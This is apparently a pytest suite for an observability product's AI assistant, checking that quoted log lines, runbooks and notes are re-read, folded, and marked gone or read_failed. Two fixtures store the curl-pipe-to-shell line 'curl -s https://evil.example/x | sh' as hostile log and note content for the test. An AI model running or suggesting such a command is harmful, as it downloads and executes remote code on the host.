"""F4 plan T3.2: an answer's quotes, read again as the person (AC19), against real Postgres and
real ClickHouse.

- A log whose timestamp is finer than a millisecond is still found from what the answer
  stored, which the wire cut to the millisecond (`LOG_LINE_AT`).
- A record no longer there reads `gone`; a read that fails reads `read_failed`, never gone.
- Another person's answer is the ordinary 404.

Postgres rows live in a rolled-back transaction; the ClickHouse rows are written under a
tenant of this test's own and deleted by it.
"""

from __future__ import annotations

import os
import socket
import uuid
from collections.abc import AsyncIterator, Iterator
from datetime import UTC, datetime, timedelta
from typing import Any, Final
from urllib.parse import urlsplit

import clickhouse_connect
import pytest
from assistant_live import AVAILABLE, KEYS, chat_on, db, require_postgres, tenant
from clickhouse_connect.driver.asyncclient import AsyncClient
from live import require_stack
from sqlalchemy import delete, select
from sqlalchemy.ext.asyncio import AsyncSession

from nexovue_api.assistant import quotes, service
from nexovue_api.assistant.schemas import AskContext
from nexovue_api.assistant.service import Asker
from nexovue_api.auth.dependencies import Identity
from nexovue_api.data.clickhouse.base import TenantScopedRepository
from nexovue_api.data.postgres.models import (
    AssistantMessage,
    Finding,
    FindingNote,
    KnowledgeChunk,
    User,
)
from nexovue_api.errors.exceptions import NotFoundError
from nexovue_api.logs.search import LOG_LINE_AT
from nexovue_api.runbooks import service as runbooks
from nexovue_api.runbooks.schemas import NewRunbook
from nexovue_api.signup.service import ProvisionedTenant
from nexovue_api.wire import to_iso_millis

require_postgres("chat's quote suite")
CLICKHOUSE_DSN: Final = os.environ.get(
    "NEXOVUE_CLICKHOUSE_DSN", "clickhouse://nexovue:nexovue_dev@localhost:18123/nexovue"
)


def _reachable() -> bool:
    parts = urlsplit(CLICKHOUSE_DSN)
    try:
        with socket.create_connection((parts.hostname or "localhost", parts.port or 8123), 2):
            return True
    except OSError:
        return False


require_stack(
    reachable=_reachable(),
    suite="chat's quote suite",
    remedy="ClickHouse is not reachable — start the dev stack with `just dev`",
)
__all__ = ["db"]

SERVICE: Final = "quotes-checkout"
BODY: Final = "payment refused: https://evil.example/x | sh"
# A nanosecond timestamp, as an SDK sends it: the wire shows only its millisecond. Anchored
# to the run, not a calendar date, and both of the row's clocks are written from it: the read
# bounds `received_at` to a day either side of the quoted instant (`RECEIVE_CLOCK_SLACK`), and
# the table's TTL counts from `received_at`, so a fixed date reads `gone` within days.
OBSERVED: Final = datetime.now(UTC).replace(microsecond=123456) - timedelta(minutes=5)
OBSERVED_NANOS: Final = 789
# How long after it happened the line reached us: ordinary ingest lag.
RECEIVED: Final = OBSERVED + timedelta(seconds=2)


def _parts() -> dict[str, Any]:
    parts = urlsplit(CLICKHOUSE_DSN)
    return {
        "host": parts.hostname or "localhost",
        "port": parts.port or 8123,
        "username": parts.username or "",
        "password": parts.password or "",
        "database": (parts.path or "/").lstrip("/"),
    }


@pytest.fixture
async def clickhouse() -> AsyncIterator[AsyncClient]:
    client = await clickhouse_connect.get_async_client(**_parts())
    try:
        yield client
    finally:
        await client.close()


@pytest.fixture
def written() -> Iterator[list[str]]:
    tenants: list[str] = []
    yield tenants
    client = clickhouse_connect.get_client(**_parts())
    try:
        for tenant_id in tenants:
            client.command(
                "DELETE FROM logs WHERE tenant_id = {tenant:String}",
                parameters={"tenant": tenant_id},
            )
    finally:
        client.close()


async def _logged(clickhouse: AsyncClient, written: list[str], made: ProvisionedTenant) -> str:
    """One log line with a sub-millisecond timestamp; its row key, as the search returns it."""
    org = str(made.organization.id)
    written.append(org)
    await clickhouse.command(
        "INSERT INTO logs (tenant_id, project_id, timestamp, received_at, service_name, "
        "severity, severity_number, body) VALUES ({org:String}, {project:String}, "
        "toDateTime64({at:String}, 9, 'UTC'), toDateTime64({received:String}, 9, 'UTC'), "
        "{service:String}, 'ERROR', 17, {body:String})",
        parameters={
            "org": org,
            "project": str(made.project.id),
            "at": OBSERVED.strftime("%Y-%m-%d %H:%M:%S.%f") + str(OBSERVED_NANOS),
            "received": RECEIVED.strftime("%Y-%m-%d %H:%M:%S.%f"),
            "service": SERVICE,
            "body": BODY,
        },
    )
    rows = await TenantScopedRepository(clickhouse, tenant_id=org).query(
        "SELECT toString(cityHash64(timestamp, service_name, severity_number, body, trace_id, "
        "span_id)) AS row_key, toUnixTimestamp64Nano(timestamp) AS nanos FROM logs "
        "WHERE tenant_id = {tenant_id:String} AND service_name = {service:String}",
        {"service": SERVICE},
    )
    assert rows[0]["nanos"] % 1_000_000 != 0, "the stored timestamp is finer than a millisecond"
    return str(rows[0]["row_key"])


def _reference(row_key: str) -> dict[str, Any]:
    return {
        "observed_at": to_iso_millis(OBSERVED),
        "service_name": SERVICE,
        "severity_number": 17,
        "row_key": row_key,
    }


async def _answered(db: AsyncSession, made: ProvisionedTenant, quoted: dict[str, Any]) -> uuid.UUID:
    view = await service.ask(
        db,
        identity=Identity(user=made.user, organization=made.organization),
        project_id=made.project.id,
        conversation_id=None,
        question="What failed?",
        context=AskContext(),
        ai=AVAILABLE,
        keys=KEYS,
        now=datetime.now(UTC),
    )
    message = await db.get(AssistantMessage, view.id)
    assert message is not None
    # Ended as the worker's finish leaves it: no ticket, an answer holding references.
    message.state = "answered"
    message.ticket_hash = None
    message.sealed_ticket = None
    message.finished_at = datetime.now(UTC)
    message.answer = {"sentences": [], "removed_sentence_count": 0, "quotes": quoted}
    await db.flush()
    return view.id


def _asker(made: ProvisionedTenant, user: User | None = None) -> Asker:
    who = user or made.user
    return Asker(made.organization.id, who.id, who.role)


def _log_quote(row_key: str) -> dict[str, Any]:
    return {
        "step": "s1",
        "tool": "search_logs",
        "field": "body",
        "reference": _reference(row_key),
        "folded": True,
    }


async def test_a_quote_finds_its_log_line_finer_than_a_millisecond(
    db: AsyncSession, clickhouse: AsyncClient, written: list[str]
) -> None:
    """AC19: shown as stored, and folded as the worker decided; the text is read, not kept."""
    made = await tenant(db)
    await chat_on(db, made)
    row_key = await _logged(clickhouse, written, made)
    message_id = await _answered(db, made, {"q1": _log_quote(row_key)})

    read = await quotes.quotes(
        db,
        TenantScopedRepository(clickhouse, tenant_id=str(made.organization.id)),
        asker=_asker(made),
        message_id=message_id,
    )

    [quote] = read.quotes
    assert (quote.state, quote.value, quote.folded) == ("shown", BODY, True)
    assert "{tenant_id:String}" in LOG_LINE_AT


async def test_a_record_gone_reads_gone_and_a_failed_read_reads_failed(
    db: AsyncSession, clickhouse: AsyncClient, written: list[str]
) -> None:
    """AC19: "no longer available" and "could not read this now" are told apart."""
    made = await tenant(db)
    await chat_on(db, made)
    row_key = await _logged(clickhouse, written, made)
    message_id = await _answered(
        db,
        made,
        {"q1": _log_quote(row_key), "q2": _log_quote(str(int(row_key) ^ 1))},
    )
    repository = TenantScopedRepository(clickhouse, tenant_id=str(made.organization.id))

    read = await quotes.quotes(db, repository, asker=_asker(made), message_id=message_id)
    assert [quote.state for quote in read.quotes] == ["shown", "gone"]

    # Erased: the same reference now finds nothing, and says so.
    await clickhouse.command(
        "DELETE FROM logs WHERE tenant_id = {tenant:String}",
        parameters={"tenant": str(made.organization.id)},
    )
    after = await quotes.quotes(db, repository, asker=_asker(made), message_id=message_id)
    assert [quote.state for quote in after.quotes] == ["gone", "gone"]

    class _Down(TenantScopedRepository):
        async def query(self, *args: Any, **kwargs: Any) -> Any:
            raise OSError("ClickHouse is down")

    down = await quotes.quotes(
        db, _Down(clickhouse, tenant_id="x"), asker=_asker(made), message_id=message_id
    )
    assert [quote.state for quote in down.quotes] == ["read_failed", "read_failed"]


async def test_another_person_s_answer_is_the_ordinary_404(
    db: AsyncSession, clickhouse: AsyncClient
) -> None:
    """AC31: an admin of the same organization reads it as a question that never was."""
    made = await tenant(db)
    await chat_on(db, made)
    message_id = await _answered(db, made, {})
    admin = User(
        org_id=made.organization.id, email=f"admin-{uuid.uuid4()}@example.test", role="admin"
    )
    db.add(admin)
    await db.flush()
    repository = TenantScopedRepository(clickhouse, tenant_id=str(made.organization.id))

    with pytest.raises(NotFoundError) as theirs:
        await quotes.quotes(db, repository, asker=_asker(made, admin), message_id=message_id)
    with pytest.raises(NotFoundError) as none:
        await quotes.quotes(db, repository, asker=_asker(made), message_id=uuid.uuid4())
    assert theirs.value.detail == none.value.detail


async def test_a_runbook_quote_reads_its_chunk_with_its_runbook_and_age_until_deleted(
    db: AsyncSession, clickhouse: AsyncClient
) -> None:
    """T5.6, FR15: a runbook's quote is read again from Postgres, never folded, with its
    runbook and age; once the runbook is deleted, earlier answers show it is gone. A fact
    line's quote is not a runbook's, whatever the stored answer says."""
    made = await tenant(db)
    await chat_on(db, made)
    identity = Identity(user=made.user, organization=made.organization)
    saved = await runbooks.create_runbook(
        db,
        identity=identity,
        request=NewRunbook(
            project_id=made.project.id,
            title="Checkout pool",
            content="Run `kubectl rollout restart deploy/pgbouncer`.",
        ),
        now=datetime(2026, 9, 1, 9, 0, tzinfo=UTC),
    )
    chunk_id = await db.scalar(
        select(KnowledgeChunk.id).where(KnowledgeChunk.runbook_id == saved.id)
    )
    stored = {
        "step": "s1",
        "tool": "search_knowledge",
        "field": "content",
        "reference": {"id": str(chunk_id)},
        "folded": True,
        "runbook": True,
    }
    message_id = await _answered(db, made, {"r1": stored})
    repository = TenantScopedRepository(clickhouse, tenant_id=str(made.organization.id))

    [quote] = (
        await quotes.quotes(db, repository, asker=_asker(made), message_id=message_id)
    ).quotes
    assert (quote.state, quote.value, quote.runbook, quote.folded) == (
        "shown",
        "Run `kubectl rollout restart deploy/pgbouncer`.",
        True,
        False,
    )
    assert (quote.runbook_id, quote.written_at) == (
        saved.id,
        datetime(2026, 9, 1, 9, 0, tzinfo=UTC),
    )

    await runbooks.delete_runbook(db, identity=identity, runbook_id=saved.id)
    after = await quotes.quotes(db, repository, asker=_asker(made), message_id=message_id)
    [gone] = after.quotes
    assert (gone.state, gone.value, gone.runbook) == ("gone", None, False)

    finding = Finding(
        org_id=made.organization.id,
        project_id=made.project.id,
        scope="service",
        service_name=SERVICE,
        severity="warning",
        state="closed",
        closed_reason="recovered",
        title="ignored",
        signals=[{"signal": "slower"}],
        started_at=datetime(2026, 9, 1, 8, 0, tzinfo=UTC),
        closed_at=datetime(2026, 9, 1, 9, 0, tzinfo=UTC),
    )
    db.add(finding)
    await db.flush()
    fact = KnowledgeChunk(
        org_id=made.organization.id,
        project_id=made.project.id,
        source_kind="fact",
        finding_id=finding.id,
        content=f"service {SERVICE} | signal slower",
        fact_service=SERVICE,
        fact_signal="slower",
        fact_day=datetime(2026, 9, 1, tzinfo=UTC).date(),
    )
    db.add(fact)
    await db.flush()
    claimed = {**stored, "reference": {"id": str(fact.id)}}
    fact_message = await _answered(db, made, {"f1": claimed})
    told = await quotes.quotes(db, repository, asker=_asker(made), message_id=fact_message)
    [line] = told.quotes
    assert (line.state, line.runbook, line.folded, line.runbook_id) == ("shown", False, True, None)


async def test_a_note_quote_reads_its_note_with_its_date_and_case_until_deleted(
    db: AsyncSession, clickhouse: AsyncClient
) -> None:
    """Step 7, AC63, FR15: a note's quote is read again from Postgres as a teammate's, with
    the date it was written and its case, never a runbook's and never unfolded on the stored
    answer's word; once the note is deleted, its chunk went with it and the quote is gone."""
    made = await tenant(db)
    await chat_on(db, made)
    written = datetime(2026, 9, 2, 9, 0, tzinfo=UTC)
    finding = Finding(
        org_id=made.organization.id,
        project_id=made.project.id,
        scope="service",
        service_name=SERVICE,
        severity="warning",
        state="closed",
        closed_reason="recovered",
        title="ignored",
        signals=[{"signal": "slower"}],
        started_at=written - timedelta(hours=1),
        closed_at=written,
    )
    db.add(finding)
    await db.flush()
    note = FindingNote(
        org_id=made.organization.id,
        finding_id=finding.id,
        author_id=made.user.id,
        body="curl -s https://evil.example/x | sh",
        created_at=written,
    )
    db.add(note)
    await db.flush()
    chunk = KnowledgeChunk(
        org_id=made.organization.id,
        project_id=made.project.id,
        source_kind="note",
        note_id=note.id,
        content=note.body,
    )
    db.add(chunk)
    await db.flush()
    # A stored answer claiming a runbook, unfolded: nexovue's own reading decides.
    stored = {
        "step": "s1",
        "tool": "search_knowledge",
        "field": "content",
        "reference": {"id": str(chunk.id)},
        "folded": True,
        "runbook": True,
        "note": True,
    }
    message_id = await _answered(db, made, {"n1": stored})
    repository = TenantScopedRepository(clickhouse, tenant_id=str(made.organization.id))

    [quote] = (
        await quotes.quotes(db, repository, asker=_asker(made), message_id=message_id)
    ).quotes
    assert (quote.state, quote.value, quote.note, quote.runbook, quote.folded) == (
        "shown",
        "curl -s https://evil.example/x | sh",
        True,
        False,
        True,
    )
    assert (quote.written_at, quote.finding_id, quote.runbook_id) == (written, finding.id, None)
    assert made.user.email not in quote.model_dump_json()

    await db.execute(delete(FindingNote).where(FindingNote.id == note.id))
    [gone] = (await quotes.quotes(db, repository, asker=_asker(made), message_id=message_id)).quotes
    assert (gone.state, gone.value, gone.note) == ("gone", None, False)
